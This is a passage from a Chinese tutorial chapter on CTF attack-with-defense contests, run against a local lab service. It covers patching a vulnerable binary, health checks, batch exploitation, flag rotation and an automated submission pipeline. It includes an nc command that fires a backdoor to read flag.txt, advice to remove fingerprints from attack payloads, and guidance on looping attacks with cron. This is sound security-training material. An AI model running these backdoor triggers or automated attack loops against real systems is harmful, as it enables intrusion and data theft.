  4012d6:	48 89 c7             	mov    rdi,rax
  4012d9:	90                   	nop
  4012da:	90                   	nop
  4012db:	90                   	nop
  4012dc:	90                   	nop
  4012dd:	90                   	nop
  4012de:	bf 30 20 40 00       	mov    edi,0x402030
  4012e3:	e8 e8 fd ff ff       	call   4010d0 <puts@plt>
  4012e8:	90                   	nop
  4012e9:	c9                   	leave
  4012ea:	c3                   	ret
```

`call gets@plt` 的位置整整齐齐 5 个 `nop`，前后指令完整——每条指令都合法，符合"改完先反汇编复查"的验收步骤。这里 nop 的对象是"对危险函数的调用"本身；同样的手法也能用在更粗的粒度上——把 `main` 里 `call debug` 那条（0x401387，同样 5 字节）nop 掉，整个调试通道从服务里消失，效果相同、粒度更粗，二选一。

> [!info]- 模式不唯一时怎么替换
> 小程序里 5 字节模式恰好唯一，大程序里同编码的 `call` 可能出现多次。处理办法是把 sed 的匹配锚定到行：`xxd` 转储里每行 16 字节带偏移前缀，先用 `grep -n 'e8 72 fe ff ff' fix.hex` 找到目标行的行号，再用 `sed -i '<行号>s/e8 72 fe ff ff/90 90 90 90 90/'` 只改那一行。还有一个陷阱要防：目标字节恰好跨在两行边界上时，任何整模式匹配都会失效——先按 `目标偏移 mod 16` 算好行内位置，跨界就换 `-c` 参数（如 `xxd -c 8`）让转储按 8 字节分行，把目标完整放进一行。

### 5.3 补丁 B：改比较逻辑堵后门

后门的判定链在 2.1 已读过：`strcmp` 比较魔串，`test eax,eax` 把"是否相等"落进 ZF 标志，`jne 401371` 在==不相等==时跳过后门体。堵后门就是让"跳过后门"成为唯一可能——把条件跳转 `jne`（`75 0a`）改成无条件跳转 `jmp`（`eb 0a`）：==操作码一个字节，位移字节原样保留==（rel8 编码以同一条下一条指令为基准，两种操作码的语义除"是否看标志"外完全相同），任何输入都到不了 `system`：

```bash
objdump -d -M intel awd_fixed | sed -n '/<main>:/,/^$/p' | sed -n '24,30p'
```

输出：

```
  40134d:	c6 44 05 e0 00       	mov    BYTE PTR [rbp+rax*1-0x20],0x0
  401352:	48 8d 45 e0          	lea    rax,[rbp-0x20]
  401356:	be 55 20 40 00       	mov    esi,0x402055
  40135b:	48 89 c7             	mov    rdi,rax
  40135e:	e8 dd fd ff ff       	call   401140 <strcmp@plt>
  401363:	85 c0                	test   eax,eax
  401365:	eb 0a                	jmp    401371 <main+0x86>
```

`jmp` 落位，后门体（0x401367 的参数装配与 0x40136c 的 `call system@plt`）成为永远不可达的死代码。

> [!warning] 把 `jne` nop 掉是反向事故
> 修补的本能之一是"把判断跳转 nop 掉"——在 crackme 里这是打开成功分支的常规操作（[[R08-CrackMe经典题型#5.2 补丁 A：nop 掉 jcc|R8 5.2]]），==在堵后门的场景里方向恰好相反==。看把 `75 0a` 换成 `90 90` 的后果：条件判断被 nop 之后不再生效，任何输入都顺序落入后门体——每个输过普通名字的用户都拿到 shell。拿这个错误版本连一下 9001，输一个完全正常的名字，后门照常触发：
>
> ```
> AWD storage v1
> name> flag{awd_teamA_1001}
> hello, guest
> debug> 
> ```
>
> 第二行起是后门 shell 执行 `cat flag.txt` 的输出。==修补方向搞反，防线直接变成漏洞放大器==——这就是补丁 B 必须在副本上改、改完必须人工复查跳转方向的原因。

> [!info]- nop 掉 `call system@plt` 也可以，但补不干净
> 另一种等价修补是把 0x40136c 的 `call system@plt`（5 字节）nop 掉。它同样堵死后门，但 `"/bin/sh"` 字符串、`system@plt` 桩、`test`/`jne` 判定链全部留在二进制里——==攻击面只是"不可达"，不是"不存在"==：一旦服务还有其他未修补的越界写（比如忘了堵的 `gets`），攻击者仍能借 ROP 调到这些现成零件拼出 getshell。修补的完整度看"漏洞点是否消失"，后门修补优先选"控制流永远到不了"的改法（jmp），再配合 5.2 堵住越界写本体。

### 5.4 把 gets 换成 fgets 的可行性

比 nop 更"温柔"的修补是保留 debug 通道、只把无界读入换成有界读入——源码层面就是 `gets(buf)` 改 `fgets(buf, 32, stdin)`。二进制层面的账算下来就不那么温柔了。先看好消息：`call gets@plt` 与 `call fgets@plt` 都是 5 字节的 `e8 rel32`，==调用点本身等长可换==。坏消息在参数：System V AMD64 ABI 下 `fgets` 要三个参数，而 `gets` 只要一个。

| 参数 | 寄存器 | 现状（2.1 反汇编） | 需要补的指令 | 长度 |
| ---- | ---- | ---- | ---- | ---- |
| buf | rdi | `lea rax,[rbp-0x20]` + `mov rdi,rax` 已备好 | 保留即可 | 0 |
| 32 | rsi | 无来源（gets 不用它） | `mov esi,0x20` | 5 字节 |
| stdin | rdx | 无来源 | `mov rdx,[rip+…stdin]` | 7 字节 |
| 调用 | — | `call gets@plt` | `call fgets@plt` | 5 字节，等长 |

补丁窗口是从 `lea`（0x4012d2）到 `call`（0x4012d9+5）共 12 字节，装下"保留 rdi 装配（7 字节）+ 补 rsi（5）+ 补 rdx（7）+ 换调用（5）"需要 24 字节——==缺口 12 字节，单点等长补丁装不下==。要凑齐只能向相邻指令借空间（比如重写前面 `printf` 的参数装配区），每借一处，"改断服务"的风险就翻一倍。行为上还有差异：`fgets` 会在缓冲里保留行尾换行、最多读 31 字节——溢出确实不可达（偏移 40 拼不出来）了，但通道语义变了，若有其他代码依赖 debug 输入的格式就会出问题。

结论：==技术上可行、工程上不划算==。AWD 防守窗口以分钟计，nop 调用（5.2）一步到位且零语义风险；fgets 改写留给赛后复盘或没有时间压力的加固。

> [!info]- 运行期替换也是一条路
> 不改文件、在运行期把 `gets` 换掉的思路同样存在：Partial RELRO 下 GOT 可写，启动后改写 `gets` 的 GOT 表项指向一个安全函数；或用 `LD_PRELOAD` 给 socat 的子进程注入一份拦截 `gets` 的自定义库。两者的前提都是==你有重启服务的权限并能把环境变量传进去==，且拦截函数自身不能写崩——工程复杂度同样高于 nop。文件补丁仍是 AWD 防守的主力手段。

### 5.5 上场：服务可用性检查与攻防对照

补丁好的二进制换上场。`socat` 的 `fork` 模式在这里帮了大忙：每个连接 fork 新进程、新进程读的是磁盘上的当前文件，==用 `mv` 原子替换文件后，下一个连接自动跑新版本，socat 不用重启==：

```bash
mv -f awd_fixed awd_srv
```

> [!warning] 替换文件用 mv，不要用 cp 覆盖
> Linux 不允许写入一个正在被执行的文件（报 `Text file busy`，即 ETXTBSY）。socat fork 出的服务进程生命周期虽短，但 `cp awd_fixed awd_srv` 撞上某个恰好活着的进程就会失败，补丁没换上还自以为换上了。`mv` 是改名操作，只换目录项、不动 inode，没有这个限制。==换完用一次连接确认，不要相信"命令没报错就是成功了"==。

上场前先跑可用性检查——这是 AWD 防守的生命线，patch 之后必做：

```python
#!/usr/bin/env python3
# check_srv.py —— 服务可用性检查：把服务的全部正常功能走一遍
# AWD 防守的生命线：patch 之后先跑它，服务活着才谈得上得分
import sys
from pwn import *
context.log_level = 'error'

TEAMS = [('127.0.0.1', 9001, 'teamA'), ('127.0.0.1', 9002, 'teamB')]

def check(host, port):
    try:
        io = remote(host, port, timeout=5)
        io.recvuntil(b'name> ')
        io.sendline(b'healthcheck')
        r1 = io.recvline()
        io.recvuntil(b'debug> ')
        io.sendline(b'ping')
        r2 = io.recvline()
        r3 = io.recvline()
        io.close()
        ok = (r1.strip() == b'hello, healthcheck'
              and r2.strip() == b'[debug] done'
              and r3.strip() == b'bye')
        msg = '功能正常' if ok else '输出异常: %r %r %r' % (r1, r2, r3)
        return ok, msg
    except Exception as e:
        return False, '连接或读取出错: %s' % e

if __name__ == '__main__':
    teams = TEAMS
    if len(sys.argv) == 3:                     # check_srv.py <host> <port>：只查一队
        teams = [(sys.argv[1], int(sys.argv[2]), 'target')]
    for host, port, name in teams:
        ok, msg = check(host, port)
        print('[%s] %s %s:%d %s' % ('OK' if ok else 'FAIL', name, host, port, msg))
```

检查的设计原则照抄裁判机：==把服务的每条正常路径都走一遍并逐段比对输出==——问候（正常功能）、done（调试通道）、bye（完整走完不崩）。只查"能连上"是不够的，patch 把某条路径改断而连接还活着的情况很常见：

```bash
python3 check_srv.py
```

输出：

```
[OK] teamA 127.0.0.1:9001 功能正常
[OK] teamB 127.0.0.1:9002 功能正常
```

双补丁上场的 teamA 功能完好。然后跑攻防对照——同一份 exp_batch，patch 前后各一次（patch 前的输出在 3.3）：

```bash
python3 exp_batch.py
```

输出：

```
[-] teamA(127.0.0.1:9001) 无 flag，目标可能已修补
[+] teamB(127.0.0.1:9002) -> flag{awd_teamB_2002}
```

后门也验一遍（对着 9001 输魔串，应得到普通问候）：

```bash
{ printf 'b4ckd00r_pls\n'; sleep 1; printf 'cat flag.txt\nexit\n'; } | timeout 5 nc 127.0.0.1 9001
```

输出：

```
AWD storage v1
name> hello, b4ckd00r_pls
debug> [debug] done
bye
```

魔串被当普通名字问候，后门消失。==patch 的验收标准就此齐了：可用性检查通过 + exp 打不出 + 后门失效，三样同时成立==。没修补的 teamB 依然被 3.3 的批量脚本打穿——对照的另一面是提醒：比赛里每队都在同时做这件事，==你的修补窗口就是别人 exp 的失效倒计时==。

修补之后的固定动作是重新跑一遍批量攻击（3.3 的脚本不减队）——确认自己还能打谁，然后立刻提交流程（第 6 节）。攻防在 AWD 里不是两个阶段，是同一个循环。

## 6. flag 轮换应对与提交自动化

flag 定时轮换是 AWD 的时间压力来源：打下的 flag 只在当前轮有效，==拿到立刻提交，轮换之后重打==。两个脚本分别对付这两件事。

先看轮换脚本的实际效果（间隔取 2 秒模拟，真实赛事通常以分钟计）：

```bash
bash demo_rotate.sh
```

输出：

```
第 1 次读: flag{awd_teamA_683114442} | flag{awd_teamB_1936531589}
第 2 次读: flag{awd_teamA_3206726035} | flag{awd_teamB_123009005}
轮换进程已停止
```

7 秒内两队的 flag 全部换新。提交端用一套提取加去重的骨架：

```python
#!/usr/bin/env python3
# submit_flag.py —— flag 提交骨架：正则提取 + 去重 + 提交接口占位
# 用法：从 exp 的输出管道接进来，或任何可能含 flag 的文本
#   python3 exp_auto.py | python3 submit_flag.py
import re
import sys

FLAG_RE = re.compile(rb'flag\{[^}\s]+\}')

def extract_flag(data: bytes):
    m = FLAG_RE.search(data)
    return m.group().decode() if m else None

submitted = set()          # 同一 flag 只提交一次；flag 轮换后内容变化，自然放行新值

def submit(flag: str) -> bool:
    if flag in submitted:
        print('[skip] 已提交过: %s' % flag)
        return False
    # 平台的提交接口按赛事文档替换，常见形如：
    # requests.post(SUBMIT_URL, data={'token': TOKEN, 'flag': flag}, timeout=5)
    print('[submit] %s' % flag)
    submitted.add(flag)
    return True

if __name__ == '__main__':
    flag = extract_flag(sys.stdin.buffer.read())
    if flag is None:
        print('[-] 输入里没有合法 flag')
        sys.exit(1)
    submit(flag)
```

与 exp 串成管线——exp 的输出直接喂给提交器：

```bash
python3 exp_auto.py 127.0.0.1 9002 | python3 submit_flag.py
```

输出：

```
[submit] flag{awd_teamB_703412590}
```

管线打通（本例 flag 的随机后缀与上面轮换演示的读数不同——两次运行之间轮换各跑各的，读数不同正是轮换生效的表现）。打已修补的队时管线走失败分支：

```bash
python3 exp_auto.py 127.0.0.1 9001 | python3 submit_flag.py
```

输出：

```
[-] 输入里没有合法 flag
```

三个工程要点放在一起看：==提取靠正则不靠格式==（各队服务的 flag 输出格式可能千奇百怪，`flag\{…\}` 是唯一可靠锚点）；==去重靠集合==（同一轮重复提交多数平台会扣分，轮换后 flag 内容变了，集合自然放行新值，逻辑上"一轮一提交"）；==提交接口务必加超时==（真实赛事的提交接口在截止前可能拥堵，一次阻塞的 POST 能卡死整个批量循环）。

> [!note] 把攻击循环整个闭环
> 完整的 AWD 攻击循环是一段定时任务：轮询队列表 → exp_batch 打一轮 → 成功的 flag 立刻 submit → 等下一个轮换周期。用 cron 或 `while true; do ...; sleep 60; done` 挂在后台，人就腾出手来做更有价值的事——分析没打动的队、修补自己的服务。手动打一轮的辉煌，抵不过自动化循环的稳定得分。

## 7. 三个高频事故现场

> [!warning] 事故一：服务被自己 patch 崩
> 三种死法，症状与复盘都在本章出现过：**指令劈断**——替换字节不等长或模式撞到无辜指令，`objdump` 复查补丁点每条指令是否完整（5.2）；**逻辑反转**——把"永远跳过后门"（jne→jmp）做成"人人进后门"（nop jne），5.3 的事故演示；**替换失败**——`cp` 覆盖正在执行的文件报 `Text file busy`，补丁根本没上场（5.5 的 mv 用法）。防线是同一条流水线：==改副本 → cmp 确认改动范围 → objdump 复查 → mv 上场 → check_srv 验收==，一步不省。另外始终留一份 `awd_srv.orig`，验收不过 10 秒回滚。

> [!warning] 事故二：socat 重启丢 flag
> `win()` 按==进程 cwd== 找 `flag.txt`，而进程的 cwd 继承自 socat 的启动目录。在错误目录启动 socat（比如在项目根目录直接 `socat ... EXEC:teamA/awd_srv`），服务能连、问候正常，打穿了 `win` 也只吐 `[win] flag.txt not found`——服务"活着"，flag 通道断了，防守分照扣、攻击手全白打。规矩只有一条：==启动脚本里 `cd` 进队伍目录再 `EXEC:./awd_srv`==（2.3 的 start_awd.sh 就是这么写的）。配套检查：环境重启后，先 `cat teamA/flag.txt` 确认各队 flag 文件在位、再 `bash start_awd.sh`、然后 check_srv——三步都在，才进入攻防循环。

> [!warning] 事故三：日志泄露自己的 payload
> 第 4 节演示了对别人的抓包还原；同一件事随时发生在你身上。三个泄露面：**平台侧**，多数 AWD 赛制的攻击流量经过裁判网络，组织者与（某些赛制下的）其他队伍可以镜像抓包，你的 payload 等于公开；**本机侧**，自己的 `tcpdump -w` 文件、socat 的转发日志、shell 历史里都留着完整 payload；**服务侧**，对方服务的访问日志若记录输入，你的 exp 会直接暴露给防守者，他修补的速度就是你 exp 失效的速度。应对按性价比排序：==少发无效包==（每轮打一遍批量即可，不要对着已修补的队反复轰）；==payload 去指纹==（填充字节不必是清一色 `A`，地址、寄存器装载数值等价时换几个字节，抓包还原的成本立刻上升）；==把 exp 当公开资产设计==（假设它会被读到，结构清晰、注释齐全的那份反而方便自己在轮换间隙快速迭代——藏不如稳）。

## 8. 常见问题

| 现象 | 原因与解决 |
| ---- | ---- |
| exp 打 A 队通、打 B 队不通 | B 队已修补或服务挂了：先对 B 跑 check_srv 区分两种情况，再决定放弃或换向量（5.5） |
| patch 后服务活着但 exp 打不出 flag | 这就是防守成功的形态：用 check_srv 确认功能后即可收工（5.5） |
| patch 后服务连接即断或无输出 | 等长被破坏或逻辑反转：`objdump` 复查补丁点每条指令，必要时回滚 orig（5.2、[[R08-CrackMe经典题型#5.5 补丁规范\|R8 5.5]]） |
| `cp` 覆盖服务文件报 Text file busy | 旧进程还在执行该文件：改用 `mv` 原子替换（5.5） |
| 把 jne nop 掉之后所有人都拿到 shell | 比较逻辑改反了：堵后门要"永远跳过"（`75`→`eb`），不是"永不去跳"（5.3 的事故演示） |
| 后门 shell 里发的命令没反应 | 命令被 `fgets` 底层 stdio 缓冲提前吞掉：分两拍发，先应答 name 行，间隔后再发 shell 命令（3.1，同 [[P07-ret2libc-ret2syscall-ret2shellcode#2.4 拼链与 getshell\|P7 2.4]]） |
| 打穿了但 win 输出 flag.txt not found | socat 启动目录不对，进程 cwd 里没有 flag 文件：cd 进队伍目录重启服务（7 的事故二） |
| 环境重启后各队 flag 对不上 | flag 文件与目录绑定：重启后先确认各目录 flag.txt 在位再开打（7 的事故二） |
| tcpdump 抓不到回环流量 | 接口选错：常规 Linux 用 `-i lo`；WSL 镜像网络下 127.0.0.1 不落 lo，用 `-i any`（4.1） |
| `-X` 输出里找不到 payload | 只看 Flags 带 P 且 length 大于 0 的包；载荷从 IP 头加 TCP 头之后开始，按数据偏移字节算（4.2） |
| 提交 flag 平台报错 | flag 已轮换：拿到立刻提交，按轮换周期安排重打（第 6 节） |
| 批量脚本被一队卡死拖垮全场 | 连接与收尾都要有 timeout，单队异常捕获后 continue（3.3） |
| 重放别人的 payload 打不动 | 对方已修补或 flag 已换：payload 本身没有时效，flag 有；先 check 再重放（4.3、第 6 节） |
| 自动脚本一发就 EOF | recvuntil 的标记与服务实际输出不一致：先 nc 把协议走一遍，按真实字节对齐标记（3.2） |

## 9. 配套练习与延伸阅读

> [!note] 实战任务：参加一场 AWD 练习赛，或把本章环境演练一遍
> ① 有条件就参加一场 AWD 练习赛，重点体验防守窗口内"修补 + 自查 + 批量反打"的节奏。
> ② 按本章本地环境完整演练：起服务 → 手工打通 → exp_batch 批量 → 抓包还原重放 → 双补丁上场 → check 与攻防对照 → 轮换与提交，全程不看我这里的命令也能走通，才算掌握。
> ③ 加练：把 exp_batch 的队列表扩到三支"队伍"，给第三份服务埋一个格式化字符串漏洞（[[P09-格式化字符串漏洞|P9]] 的 `printf(user_buf)` 形状），分别练它的利用与它的 patch（nop 掉那次 `call printf@plt`，再用 check_srv 确认服务功能）。

延伸阅读按用途分三档：

- **工具与脚本**：pwntools 的 remote/recvuntil/recvall 在 [[P05-pwntools与GDB插件工具链#3. 连接与输入输出：process、remote 与一套收发函数|P5 第 3 节]]；tcpdump 的过滤表达式写法见其手册的 pcap-filter 一节，本章用到的只有 `tcp port` 一个原语；开源 AWD 训练平台（GitHub 搜 awd platform、awd judge）的裁判与轮换实现值得读一遍，对照本章 2.3 与第 6 节的自建版。
- **修补技术**：等长补丁的完整方法论在 [[R08-CrackMe经典题型#5.5 补丁规范|R8 5.5]] 与其第 5 节；被 nop 的漏洞如果来自编译期加固缺失，[[P04-Linux安全缓解机制|P4]] 的机制表能帮你判断"哪些漏洞本可以不出现"。
- **后续章节**：AWD 里的队伍分工、时间管理与 WriteUp 沉淀 → [[R17-赛事策略与团队协作|R17]]；把本章的攻防循环放进整体参赛策略 → [[P22-综合实战赛事策略与AI辅助|P22]]。
